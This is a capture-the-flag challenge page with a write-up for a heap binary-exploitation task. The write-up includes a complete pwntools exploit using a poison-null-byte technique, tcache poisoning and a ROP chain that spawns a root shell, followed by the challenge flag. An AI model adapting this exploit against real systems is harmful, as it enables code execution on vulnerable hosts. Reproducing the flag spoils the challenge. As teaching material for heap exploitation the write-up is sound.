# House of Santa Claus

- Published: 12/25/2024 (#25/25 in event)
- Category: Binary exploitation
- Points: 200
- Author: Kolmus

Through halls adorned with yuletide cheer,  
Lies a secret no one dares go near.  
In the House of Santa, deep and dark,  
A mystery lurks, waiting to leave its mark.

Elves speak of whispers in the night,  
Of a backdoor hidden out of sight.  
Crafted by the sharpest mind,  
A flaw for only the brave to find.

Snowflakes fall in silent grace,  
Masking the danger in this place.  
Many have ventured, bold and bright,  
But none have returned to tell of their plight.

Can you, dear challenger, face the test?  
Outwit the fortress and be the best?  
Unlock the secrets, break the chains,  
Solve the puzzle where darkness reigns.

Santa’s house is not what it seems,  
A labyrinth of code, a realm of dreams.  
With malloc and free, the game is set,  
Enter now, if you dare, with no regret.

This Christmas, the gauntlet is thrown,  
In the House of Santa, your skills must be shown.  
An epic quest, where legends are made,  
Dive into the code, and do not be afraid.

For in the heart of Santa's lair,  
Lies the secret, if you dare.  
Crack the heap, find the flaw,  
And become the hero of them all.

Connect using `nc ctf.csd.lol 8888`.

## Attachments

- [hosc](https://files.vipin.xyz/api/public/dl/jG_bmWE0/Day%2025%20-%20help/hosc)
- [libc.so.6](https://files.vipin.xyz/api/public/dl/gVMlV7Sp/Day%2023%20-%20help/libc.so.6)
- [ld-linux-x86-64.so.2](https://files.vipin.xyz/api/public/dl/FPHHhdd7/Day%2023%20-%20help/ld-linux-x86-64.so.2)

## Hints

**Hint 1:**

In the heart of the code, a riddle lies,  
A tiny flaw, hidden from plain eyes.  
It’s part of every string you see,  
Yet, at the same time, it seems to flee.

Before you ponder why things go amiss,  
Understand the rules in this abyss.  
Constraints are key, don’t overlook,  
Or you’ll be ensnared by this cryptic hook.

**Hint 2:**

Seek the wisdom of those who've tread,  
Shellphish's how2heap, the path ahead.  
Copy-pasting won't lead to the crown,  
A proof of concept may let you down.

To find the way, you must explore,  
Beyond the guides, delve into the core.  
The challenge here is more than mere jest,  
Solve the puzzle, and pass the true test.

## Write-up

<details>
<summary>Reveal write-up</summary>

The program has an off-by-null error in the scanf option.

```c
// (reverse engineered pseudo code)
// malloc option
...
    alloc_struct.allocations[idx] = malloc(size);
    alloc_struct.sizes[idx] = size;
...
// scanf option
...
    int size = alloc_struct.sizes[idx];

    if (size != 0) {
        char fmt[16];
        snprintf(fmt, 16, "%%%ds", size);
        scanf(fmt, alloc_struct.allocations[idx]);
        continue;
    }
...
```

Another thing it fails to do is to clear new allocations. This will later allow us to leak a libc pointer through an
unsorted bin chunk.

There are two common heap exploitation techniques that can be used for an off-by-null bug. House of Einherjar and poison
null byte. House of Einherjar is probably easier to use in this case, but I chose to adapt a poison null byte script I
had already lying around. It's important to note that whitespace characters `b'\t\n\v\f\r '` can't be used in a payload
since scanf is used to read user input. We're also limited to 16 concurrent allocations.

The poison null byte POC leaves me with an overlapping chunk that I then use to read from and write to a freed pointer.
This gets me arbitrary read/write on any 16bit aligned address. After leaking libc, I leak a stack pointer through
`__libc_argv` and overwrite scanf's return address with a rop chain to pop a shell.

For more information refer to the comments in the script.

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./hosc_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

context.terminal = ['cmd.exe', '/c', 'start', 'cmd.exe', '/c', 'wsl.exe']

HOST = 'ctf.csd.lol'
PORT = 8888

def debug(p):
    gdb.attach(p)
    input('debugger started. press enter to continue ...')

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    else:
        p = process([exe.path])
    return p

# scanf is used to take input. for %[width]s scanf stops reading at the first white space character (or when the field width is reached).
bad_scanf = b'\t\n\v\f\r '

'''
struct alloc_struct {
    void *allocations[16];
    int sizes[16];
};
'''

# helper functions:
def malloc(idx=0, size=16):
    # max size is 0x1000 -> we can use all bins
    '''
    alloc_struct.allocations[idx] = malloc(size)
    alloc_struct.sizes[idx] = size
    '''
    global p
    p.clean()
    p.sendline(b'malloc %d %d' % (idx, size))

def free(idx=0):
    # checks whether the index is allocated first. no double free.
    '''
    free(alloc_struct.allocations[idx])
    alloc_struct.allocations[idx] = 0
    alloc_struct.sizes[idx] = 0
    '''
    global p
    p.clean()
    p.sendline(b'free %d' % (idx))

def puts(idx=0):
    # checks whether the index is allocated first. no uaf.
    '''
    printf("data: ");
    puts(alloc_struct.allocations[idx]);
    '''
    global p
    p.clean()
    p.sendline(b'puts %d' % (idx))

def scanf(idx=0, data=p64(0)):
    # checks whether the index is allocated first. no uaf.
    '''
    scanf(0, scratch, alloc_struct.sizes[idx])
    memcpy(alloc_struct.allocations[idx], scratch, alloc_struct.sizes[idx])
    alloc_struct.allocations[idx][alloc_struct.sizes[idx]] = 0
    '''
    if any ((b in bad_scanf) for b in data):
        print(data)
        print('bad bytes:', ' '.join(hex(b) for b in data if b in bad_scanf))
        raise ValueError('bad bytes')

    global p
    p.clean()
    p.sendline(b'scanf %d ' % (idx) + data)

def mangle(heap_address, value):
    return (heap_address >> 12) ^ value

# poison null byte - modified to work with the challenge
# original POC: https://github.com/shellphish/how2heap/blob/master/glibc_2.39/poison_null_byte.c
'''
the goal here is to create a fake chunk that will be placed in the unsorted bin through backward
consolidation of the victim chunk. the fake chunk will be created insite another chunk's data
so that part of it gets freed and available for allocation while the actual chunk is still in use.
this means we will end up with 2 chunks overlapping. one will start at ...0010 and the other at ...0020.
'''

while True:
    try:
        p = conn()

        # allocate padding
        '''
        I noticed that the first allocation will always start at ...2a0
        here I am hoping for aslr giving me an address with ...f2a0 at the end
        this malloc will then bump the heap up to ...10010 with a relatively small padding chunk
        '''
        malloc(12, 0xd60)

        # allocate prev chunk and victim chunk
        '''
        here I use 0xf08 instead of 0x500 like the POC.
        this is so that the metadata of prev and victim will overlap 8 bytes by default.
        to save memory, the pre_size field of a chunk whose PREV_INUSE bit is set
        (i.e., the previous chunk is not free) is used by the previous chunk!
        the reason I use 0xf08 and not 0x508 is because following the setup of the POC
        will result in white space characters in the data I send later.
        '''
        malloc(0, 0xf08) # prev.size will still be 0xf10
        malloc(14, 0xef0) # victim chunk

        malloc(15, 0x10) # guard chunk to avoid consolidation

        # link prev into largebin
        '''
        this is where it gets interesting. to populate the fd and bk pointers of the fake chunk, we will
        use the fd_nextsize and bk_nextsize fields of the "prev" chunk. to do this, we need to link "prev"
        into the largebin and give it 2 more neighbors (a and b) so that there will actually be a
        fd_nextsize and bk_nextsize field to be written into "prev"s fields.
        a has to be a little bit smaller than prev and b has to be a little bit bigger than prev.
        '''
        malloc(1, 0xef0)
        malloc(2, 0x10) # guard chunk to avoid consolidation

        malloc(3, 0xf20) # for some reason I used 0xf20 when it should have been 0xf10 (but if I change it, the rest somehow breaks lol)
        malloc(4, 0x20) # guard chunk to avoid consolidation

        '''
        Current Heap Layout. no bad bytes in any important address.
            ... ...
        padding
            prev Chunk(addr=0x??0010, size=0xf10)
            victim Chunk(addr=0x??0f20, size=0xf00)
        barrier Chunk(addr=0x??1e20, size=0x20)
                a Chunk(addr=0x??1e40, size=0xf00)
        barrier Chunk(addr=0x??2d40, size=0x20)
                b Chunk(addr=0x??2d60, size=0xf30)
        barrier Chunk(addr=0x??3c90, size=0x20)
        '''

        # now free the chunks
        free(1)
        free(3)
        free(0)
        # current unsorted_bin: header <-> [prev, size=0xf10] <-> [b, size=0xf30] <-> [a, size=0xf00]
        # allocate a big chunk to sort the unsorted bin and get the 3 chunks into largebin
        malloc(5, 0x1000)
        # current large_bin: header <-> [b, size=0xf30] <-> [prev, size=0xf10] <-> [a, size=0xf00]
        # the fd_nextsize of prev now points to a: ...1e40
        # the bk_nextsize of prev now points to b: ...2d60

        # allocate prev again to construct the fake chunk
        malloc(13, 0xf08) # = ...0010
        # I use this moment to leak the fd pointer of prev2 which points to the chunk of "a" (...1e30)
        puts(13)
        p.recvuntil(b'data: ')
        leak = u64(p.recv(6).ljust(8, b'\0'))
        print('HEAP LEAK:', hex(leak))
        # verify that the heap base acutally started where we wanted it to
        if (leak-0x1e30) & 0xffff != 0:
            p.close()
            continue

        effective_heap_base = leak - 0x1e30
        print('EFFECTIVE HEAP BASE:', hex(effective_heap_base))
        # we now use the leaked ptr to create a fake chunk inside prev2.
        fd = leak
        print('fd:', hex(fd))
        bk = leak + 0xf20
        print('bk:', hex(bk))

        scanf(13, p64(0) + p64(0xf01) + p64(fd) + p64(bk) + b'\0'*0xee0)

        malloc(6, 0xf20)

        scanf(6, b'\x10') # this changes ...1e30 to ...0010 (the null is from the off-by-null)

        malloc(7, 0xef0)
        free(7)
        # now if we free victim into the unsorted bin as well, a->bk will point to victim (...0f10)
        free(14)
        # now we take a back out of the unsorted bin
        malloc(8, 0xef0)
        # now we can modify a->bk the same way we did with b->fd, and change it to our fake chunk (...0010)
        scanf(8, p64(0) + b'\x10')

        # use backward consolidation to add the fake chunk into unsorted bin
        # first, we take the victim chunk back out of the unsorted bin
        malloc(9, 0xef0)
        # now we write all of the fake data again, but this time we overflow the null into victim.size
        # this will mark the fake chunk as free.
        scanf(13, p64(0) + p64(0xf01) + p64(fd) + p64(bk) + b'\0'*0xee0 + p64(0xf00))

        free(9)

        # end poc.

        malloc(9, 0x10) # padding
        malloc(10, 0xef0-0x20) # ...0040
        free(13)
        malloc(13, 0x20) # padding

        malloc(11, 0xee0) # ...0040

        free(11)
        malloc(11, 0xee0) # ...0040
        puts(10)
        p.recvuntil(b'data: ')

        leak = u64(p.recv(6).ljust(8, b'\0'))
        print('LIBC LEAK:', hex(leak))

        libc_base = leak - 0x2041a0
        print('LIBC BASE:', hex(libc_base))

        __libc_argv = libc_base + 0x2046e0 # unlike environ, this is 16bit aligned
        print('__libc_argv:', hex(__libc_argv))

        free(5)
        free(11)
        malloc(11) # ...0040
        malloc(5) # ...0060
        free(5)
        free(11)

        mangled = mangle(effective_heap_base+0x40, __libc_argv)
        print('-> mangled:', hex(mangled))

        scanf(10, p64(mangled))

        malloc(11) # ...0040
        malloc(5) # __libc_argv

        puts(5)
        p.recvuntil(b'data: ')

        __libc_argv_leak = u64(p.recv(6).ljust(8, b'\0'))
        print('__libc_argv_leak:', hex(__libc_argv_leak))

        scanf_ret_minus_0x18 = (__libc_argv_leak - 0x128) - 0x100
        print('scanf_ret_minus_0x18:', hex(scanf_ret_minus_0x18))

        free(2)
        free(4)
        malloc(2, 0x100) # ...0060
        malloc(4, 0x100) # ...0170
        free(4)
        free(2)

        mangled = mangle(effective_heap_base+0x60, scanf_ret_minus_0x18)
        print('-> mangled:', hex(mangled))

        main_arena = libc_base + 0x203ac0
        key = main_arena + 0x60
        key = main_arena + 0x70
        print('fake key:', hex(key)) # not sure if this is even necessary

        scanf(10, b'A'*0x30 + p64(0) + p64(0x111) + p64(mangled) + p64(key))

        malloc(2, 0x100) # ...0080
        malloc(4, 0x100) # scanf_ret_minus_0x18

        puts(4)
        p.recvuntil(b'data: ')

        scanf_ret_minus_0x18_leak = u64(p.recv(6).ljust(8, b'\0'))
        print('scanf_ret_minus_0x18_leak:', hex(scanf_ret_minus_0x18_leak))

        print('building ROP chain ...')
        libc.address = libc_base
        rop = ROP(libc, badchars=bad_scanf)

        # setuid(0), system('/bin/sh')

        rop.setuid(0) # root shell if suid ...
        rop.system(next(libc.search(b'/bin/sh\x00')))

        print(rop.dump())

        scanf(4, p64(0)*3 + rop.chain())

        p.interactive()
        # cat flag.txt
        # csd{XM4s_I5_N07_TH3_tImE_4_P01sOnoU5_4cT5}
        break
    except ValueError:
        p.close()
```

Flag: `csd{XM4s_I5_N07_TH3_tImE_4_P01sOnoU5_4cT5}`

</details>

Write-up by Kolmus
